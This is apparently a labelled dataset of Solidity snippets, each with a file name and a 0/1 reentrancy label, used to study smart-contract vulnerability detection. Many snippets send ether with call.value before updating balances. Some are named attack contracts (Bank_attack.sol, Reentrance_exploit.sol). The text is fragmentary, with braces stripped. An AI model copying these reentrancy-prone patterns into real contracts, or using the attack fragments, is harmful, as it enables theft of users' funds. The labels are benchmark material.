_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
1411 31565.sol
31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1412 35878.sol
35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner)
public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner)
public
payable
feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
1413 6881.sol
6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
1414 PrivateBank.sol
PrivateBank.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1415 1123.sol
1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1416 39662.sol
39662.sol
function sendToCharger(uint id){
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw;
0
---------------------------------
1417 28974.sol
28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
1
---------------------------------
1418 27188.sol
27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if ( investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
1419 10297.sol
10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
1420 14620.sol
14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
1421 38651.sol
38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
1422 38888.sol
38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
1423 39994.sol
39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
1424 14741.sol
14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1425 29601.sol
29601.sol
function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(
uint256 _time,
address _from,
address _to,
uint256 _value,
bytes _data,
bool _useCustomFallback,
string _customFallback
)
internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
1426 38724.sol
38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
1427 21277.sol
21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
_;
contract EthernameRaw is Managed {
event Transfer(
address indexed from,
address indexed to,
bytes32 indexed name
);
event Approval(
address indexed owner,
address indexed approved,
bytes32 indexed name
);
event SendEther(
address indexed from,
address indexed to,
bytes32 sender,
bytes32 recipient,
uint256 value
);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
1428 18145.sol
18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1429 12454.sol
12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
1430 30178.sol
30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
1431 4598.sol
4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
1432 Bank_attack.sol
Bank_attack.sol
function step1(uint256 amount)  payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount)  {
step1(amount);
step2(amount / 2);
1
---------------------------------
1433 22805.sol
22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
1434 Reentrance_exploit.sol
Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
1435 14353.sol
14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
1436 2301.sol
2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1437 33851.sol
33851.sol
function donate( bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
1438 36732.sol
36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1439 27159.sol
27159.sol
function transfer(address to, uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1440 27398.sol
27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1441 15458.sol
15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom( address from, address to, uint256 value ) public  returns (bool success)  {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer( address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
1442 35617.sol
35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1443 19128.sol
19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
1
---------------------------------
1444 Victim.sol
Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
1445 25808.sol
25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
1446 21111.sol
21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1447 33501.sol
33501.sol
function executeTransaction(bytes32 transactionId)   public   notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1448 Reentrance_01.sol
Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){
throw;
userBalance[msg.sender] = 0;
1
---------------------------------
1449 1751.sol
1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
1
---------------------------------
1450 14579.sol
14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
1451 37836.sol
37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
1452 774.sol
774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1453 Reentrance_03.sol
Reentrance_03.sol
function withdrawBalance_fixed(){
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
1454 7530.sol
7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1455 36645.sol
36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
1456 39749.sol
39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency {
calcRefund(msg.sender);
0
---------------------------------
1457 36334.sol
36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
